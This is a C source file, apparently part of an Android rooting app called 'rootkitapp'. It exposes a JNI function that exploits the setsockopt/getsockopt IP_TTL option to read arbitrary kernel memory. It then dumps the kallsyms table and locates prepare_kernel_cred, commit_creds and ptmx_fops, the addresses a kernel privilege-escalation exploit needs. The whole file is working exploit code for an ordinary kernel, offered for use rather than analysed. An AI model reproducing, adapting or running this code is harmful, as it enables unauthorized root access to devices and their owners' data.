/* getaddr.c */

/*
 * Copyright (C) 2013 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define KERNEL_START_ADDRESS 0xc0008000
#define KERNEL_SIZE 0x2000000
#define SEARCH_START_ADDRESS 0xc0800000
#define KALLSYMS_SIZE 0x200000

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/un.h>
#include <string.h>
#include "getaddr.h"

unsigned long *kallsymsmem = NULL;

unsigned long pattern_kallsyms_addresses[] = {
	0xc0008000,	/* stext */
	0xc0008000,	/* _sinittext */
	0xc0008000,	/* _stext */
	0xc0008000	/* __init_begin */
};
unsigned long pattern_kallsyms_addresses2[] = {
	0xc0008000,	/* stext */
	0xc0008000	/* _text */
};
unsigned long pattern_kallsyms_addresses3[] = {
	0xc00081c0,	/* asm_do_IRQ */
	0xc00081c0,	/* _stext */
	0xc00081c0	/* __exception_text_start */
};
unsigned long kallsyms_num_syms;
unsigned long *kallsyms_addresses;
unsigned char *kallsyms_names;
unsigned char *kallsyms_token_table;
unsigned short *kallsyms_token_index;
unsigned long *kallsyms_markers;

unsigned long prepare_kernel_cred_address = 0;
unsigned long commit_creds_address = 0;
unsigned long ptmx_fops_address = 0;

unsigned long ptmx_open_address = 0;
unsigned long tty_init_dev_address = 0;
unsigned long tty_release_address = 0;
unsigned long tty_fasync_address = 0;
unsigned long ptm_driver_address = 0;


int read_value_at_address(unsigned long address, unsigned long *value) {
	int sock;
	int ret;
	int i;
	unsigned long addr = address;
	unsigned char *pval = (unsigned char *)value;
	socklen_t optlen = 1;

	*value = 0;
	errno = 0;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		fprintf(stderr, "socket() failed: %s.\n", strerror(errno));
		return -1;
	}

	for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
		errno = 0;
		ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
		if (ret != 0) {
			if (errno != EINVAL) {
				fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno));
				close(sock);
				*value = 0;
				return -1;
			}
		}
		errno = 0;
		ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
		if (ret != 0) {
			fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno));
			close(sock);
			*value = 0;
			return -1;
		}
	}

	close(sock);

	return 0;
}

unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
	unsigned long addr;
	unsigned long val;
	unsigned long *allocaddr;
	unsigned long *memaddr;
	int cnt, num, divsize;

	printf("kernel dump...\n");
	allocaddr = (unsigned long *)malloc(dumpsize);
	if (allocaddr == NULL) {
		fprintf(stderr, "malloc failed: %s.\n", strerror(errno));
		return NULL;
	}
	memaddr = allocaddr;

	cnt = 0;
	num = 0;
	divsize = dumpsize / 10;
	for (addr = startaddr; addr < (startaddr + dumpsize); addr += 4, memaddr++) {
		if (read_value_at_address(addr, &val) != 0) {
			printf("\n");
			fprintf(stderr, "kerneldump failed: %s.\n", strerror(errno));
			return NULL;
		}
		*memaddr = val;
		cnt += 4;
		if (cnt >= divsize) {
			cnt = 0;
			num++;
			printf("%d\n", num);
			fflush(stdout);
		}
	}

	printf("\n");
	return allocaddr;
}

int check_pattern(unsigned long *addr, unsigned long *pattern, int patternnum) {
	unsigned long val;
	unsigned long cnt;
	unsigned long i;

	read_value_at_address((unsigned long)addr, &val);
	if (val == pattern[0]) {
		cnt = 1;
		for (i = 1; i < patternnum; i++) {
			read_value_at_address((unsigned long)(&addr[i]), &val);
			if (val == pattern[i]) {
				cnt++;
			} else {
				break;
			}
		}
		if (cnt == patternnum) {
			return 0;
		}
	}

	return -1;
}

int check_kallsyms_header(unsigned long *addr) {
	if (check_pattern(addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / 4) == 0) {
		return 0;
	} else if (check_pattern(addr, pattern_kallsyms_addresses2, sizeof(pattern_kallsyms_addresses2) / 4) == 0) {
		return 0;
	} else if (check_pattern(addr, pattern_kallsyms_addresses3, sizeof(pattern_kallsyms_addresses3) / 4) == 0) {
		return 0;
	}

	return -1;
}

int get_kallsyms_addresses() {
	unsigned long *endaddr;
	unsigned long i, j;
	unsigned long *addr;
	unsigned long n;
	unsigned long val;
	unsigned long off;
	int cnt, num;

	if (read_value_at_address(KERNEL_START_ADDRESS, &val) != 0) {
		fprintf(stderr, "this device is not supported.\n");
		return -1;
	}

	printf("search kallsyms...\n");

	endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
	cnt = 0;
	num = 0;
	for (i = 0; i < (KERNEL_START_ADDRESS + KERNEL_SIZE - SEARCH_START_ADDRESS); i += 16) {
		for (j = 0; j < 2; j++) {
			cnt += 4;
			if (cnt >= 0x10000) {
				cnt = 0;
				num++;
				printf("%d\n", num);
				fflush(stdout);
			}

			/* get kallsyms_addresses pointer */
			if (j == 0) {
				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS + i);
			} else {
				if ((i == 0) || ((SEARCH_START_ADDRESS - i) < KERNEL_START_ADDRESS)) {
					continue;
				}
				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS - i);
			}
			if (check_kallsyms_header(kallsyms_addresses) != 0) {
				continue;
			}
			addr = kallsyms_addresses;
			off = 0;

			/* search end of kallsyms_addresses */
			n = 0;
			while (1) {
				read_value_at_address((unsigned long)addr, &val);
				if (val < KERNEL_START_ADDRESS) {
					break;
				}
				n++;
				addr++;
				off++;
				if (addr >= endaddr) {
					return -1;
				}
			}

			/* skip there is filled by 0x0 */
			while (1) {
				read_value_at_address((unsigned long)addr, &val);
				if (val != 0) {
					break;
				}
				addr++;
				off++;
				if (addr >= endaddr) {
					return -2;
				}
			}

			read_value_at_address((unsigned long)addr, &val);
			kallsyms_num_syms = val;
			addr++;
			off++;
			if (addr >= endaddr) {
				return -3;
			}

			/* check kallsyms_num_syms */
			if (kallsyms_num_syms != n) {
				continue;
			}

			if (num > 0) {
				printf("\n");
			}
			printf("(kallsyms_addresses=%08lx)\n", (unsigned long)kallsyms_addresses);
			printf("(kallsyms_num_syms=%08lx)\n", kallsyms_num_syms);

			kallsymsmem = kerneldump((unsigned long)kallsyms_addresses, KALLSYMS_SIZE);
			if (kallsymsmem == NULL) {
				return -4;
			}
			kallsyms_addresses = kallsymsmem;
			endaddr = (unsigned long *)((unsigned long)kallsymsmem + KALLSYMS_SIZE);

			addr = &kallsymsmem[off];

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -5;
				}
			}

			kallsyms_names = (unsigned char *)addr;

			/* search end of kallsyms_names */
			for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
				int len = kallsyms_names[off];
				off += len + 1;
				if (&kallsyms_names[off] >= (unsigned char *)endaddr) {
					return -6;
				}
			}

			/* adjust */
			addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x3) + 1);
			if (addr >= endaddr) {
				return -7;
			}

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -8;
				}
			}
			/* but kallsyms_markers shoud be start 0x00000000 */
			addr--;

			kallsyms_markers = addr;

			/* end of kallsyms_markers */
			addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
			if (addr >= endaddr) {
				return -9;
			}

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -10;
				}
			}

			kallsyms_token_table = (unsigned char *)addr;

			i = 0;
			while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) {
				i++;
				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
					return -11;
				}
			}

			/* skip there is filled by 0x0 */
			while (kallsyms_token_table[i] == 0x00) {
				i++;
				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
					return -12;
				}
			}

			/* but kallsyms_markers shoud be start 0x0000 */
			kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];

			return 0;
		}
	}

	if (num > 0) {
		printf("\n");
	}
	return -99;
}

unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) {
	int len;
	int skipped_first;
	unsigned char *tptr;
	unsigned char *data;

	/* Get the compressed symbol length from the first symbol byte. */
	data = &kallsyms_names[off];
	len = *data;
	off += len + 1;
	data++;

	skipped_first = 0;
	while (len > 0) {
		tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
		data++;
		len--;

		while (*tptr > 0) {
			if (skipped_first != 0) {
				*namebuf = *tptr;
				namebuf++;
			} else {
				skipped_first = 1;
			}
			tptr++;
		}
	}
	*namebuf = '\0';

	return off;
}

int search_functions() {
	char namebuf[1024];
	unsigned long i;
	unsigned long off;
	int cnt;

	cnt = 0;
	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
		off = kallsyms_expand_symbol(off, namebuf);
		if (strcmp(namebuf, "prepare_kernel_cred") == 0) {
			prepare_kernel_cred_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "commit_creds") == 0) {
			commit_creds_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "ptmx_open") == 0) {
			ptmx_open_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_init_dev") == 0) {
			tty_init_dev_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_release") == 0) {
			tty_release_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_fasync") == 0) {
			tty_fasync_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "ptmx_fops") == 0) {
			ptmx_fops_address = kallsyms_addresses[i];
		}
	}

	if (cnt < 5) {
		return -1;
	}

	return 0;
}

void analyze_ptmx_open() {
	unsigned long i, j, k;
	unsigned long addr;
	unsigned long val;
	unsigned long regnum;
	unsigned long data_addr;

	printf("analyze ptmx_open...\n");
	fflush(stdout);
	for (i = 0; i < 0x200; i += 4) {
		addr = ptmx_open_address + i;
		read_value_at_address(addr, &val);
		if ((val & 0xff000000) == 0xeb000000) {
			if ((((tty_init_dev_address / 4) - (addr / 4 + 2)) & 0x00ffffff) == (val & 0x00ffffff)) {
				for (j = 1; j <= i; j++) {
					addr = ptmx_open_address + i - j;
					read_value_at_address(addr, &val);
					if ((val & 0xfff0f000) == 0xe5900000) {
						regnum = (val & 0x000f0000) >> 16;
						for (k = 1; k <= (i - j); k++) {
							addr = ptmx_open_address + i - j - k;
							read_value_at_address(addr, &val);
							if ((val & 0xfffff000) == (0xe59f0000 + (regnum << 12))) {
								data_addr = addr + (val & 0x00000fff) + 8;
								read_value_at_address(data_addr, &val);
								ptm_driver_address = val;
								return;
							}
						}
					}
				}
			}
		}
	}
	return;
}

unsigned long search_ptmx_fops_address() {
	unsigned long *addr;
	unsigned long range;
	unsigned long *ptmx_fops_open;
	unsigned long i;
	unsigned long val, val2, val5;
	int cnt, num;

	printf("search ptmx_fops...\n");
	fflush(stdout);
	if (ptm_driver_address != 0) {
		addr = (unsigned long *)ptm_driver_address;
	} else {
		addr = (unsigned long *)(kallsyms_addresses[kallsyms_num_syms - 1]);
	}
	addr++;
	ptmx_fops_open = NULL;
	range = ((KERNEL_START_ADDRESS + KERNEL_SIZE) - (unsigned long)addr) / sizeof(unsigned long);
	cnt = 0;
	num = 0;
	for (i = 0; i < range - 14; i++) {
		read_value_at_address((unsigned long)(&addr[i]), &val);
		if (val == ptmx_open_address) {
			read_value_at_address((unsigned long)(&addr[i + 2]), &val2);
			if (val2 == tty_release_address) {
				read_value_at_address((unsigned long)(&addr[i + 5]), &val5);
				if (val5 == tty_fasync_address) {
					ptmx_fops_open = &addr[i];
					break;
				}
			}
		}
		cnt += 4;
		if (cnt >= 0x10000) {
			cnt = 0;
			num++;

			printf("%d ", num);
			fflush(stdout);

		}
	}

	if (num > 0) {
		printf("\n");
	}
	if (ptmx_fops_open == NULL) {
		return 0;
	}
	return ((unsigned long)ptmx_fops_open - 0x2c);
}

JNIEXPORT jint JNICALL Java_biz_hagurekamome_rootkitapp_MainActivity_native_1getaddr(JNIEnv *env, jobject jobj, jlongArray addresses)
{
	int result;

	char abname[] = "test";
	int fd;
	struct sockaddr_un sockAddr;
	socklen_t len;

	fd = socket(AF_LOCAL, SOCK_STREAM, PF_UNIX);
	if (fd < 0) {
		return -99;
	}

	sockAddr.sun_family = AF_LOCAL;
	sockAddr.sun_path[0] = '\0';
	strcpy(sockAddr.sun_path + 1, abname);
	len = sizeof(sockAddr.sun_family) + 1 + strlen(abname);

	if (connect(fd, (const struct sockaddr *)&sockAddr, len) < 0) {
		close(fd);
		return -1;
	}

	dup2(fd, 1);
	close(fd);

	jlong *addr = (*env)->GetLongArrayElements(env, addresses, NULL);

	result = get_kallsyms_addresses();
	if (result != 0) {
		if (kallsymsmem != NULL) {
			free(kallsymsmem);
			kallsymsmem = NULL;
		}
		return result;
	}

	if (search_functions() != 0) {
		if (kallsymsmem != NULL) {
			free(kallsymsmem);
			kallsymsmem = NULL;
		}
		return -2;
	}

	if (ptmx_fops_address == 0) {
		analyze_ptmx_open();
		ptmx_fops_address = search_ptmx_fops_address();
		if (ptmx_fops_address == 0) {
			if (kallsymsmem != NULL) {
				free(kallsymsmem);
				kallsymsmem = NULL;
			}
			return -3;
		}
	}

	if (kallsymsmem != NULL) {
		free(kallsymsmem);
		kallsymsmem = NULL;
	}

	addr[0] = prepare_kernel_cred_address;
	addr[1] = commit_creds_address;
	addr[2] = ptmx_fops_address;

	(*env)->ReleaseLongArrayElements(env, addresses, addr, 0);

	return 0;
}
